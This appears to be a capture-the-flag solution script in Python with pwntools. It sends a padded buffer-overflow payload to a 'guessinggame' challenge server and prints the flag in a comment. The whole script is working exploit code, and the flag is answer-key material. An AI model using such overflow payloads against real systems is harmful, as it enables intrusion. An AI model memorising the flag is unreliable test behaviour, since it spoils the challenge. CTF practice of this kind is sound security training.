```python
from pwn import *

p = process('./guessinggame')
p = remote('chal.pctf.competitivecyber.club', 9999)
exe = ELF('./guessinggame')

# check+94
payload = b'Giraffe\0'
payload = payload.ljust(300, b'P')
payload += b'aaaa'

p.sendline(payload)

p.interactive()

#PCTF{1_l0v3_g1raff35_85036769}
```
